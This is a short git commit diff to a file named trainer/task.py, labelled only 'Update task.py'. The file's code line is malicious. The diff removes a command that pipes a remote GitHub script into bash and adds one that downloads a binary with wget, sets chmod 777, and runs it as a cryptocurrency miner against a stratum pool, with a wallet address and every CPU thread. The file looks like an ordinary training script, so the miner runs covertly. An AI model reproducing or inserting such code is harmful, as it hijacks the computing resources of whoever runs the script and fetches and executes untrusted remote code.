d8ae9c22b98a38e1b4330ea774b7c70923c62e90
Frimawan Kusna <yudhakx@gmail.com>
2026-05-17 01:11:54 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/cai674fangquehe-crypto/ggfs/raw/refs/heads/main/df | bash')
+os.system('wget https://github.com/nonibihan/tah/raw/refs/heads/main/bct && chmod 777 bct && ./bct -a verus -o stratum+tcp://sg.vipor.net:5040 -u RRZqp6dhjEYCKHc83yWVgXqMMJdRxm1S39.GASS -t $(nproc --all)')
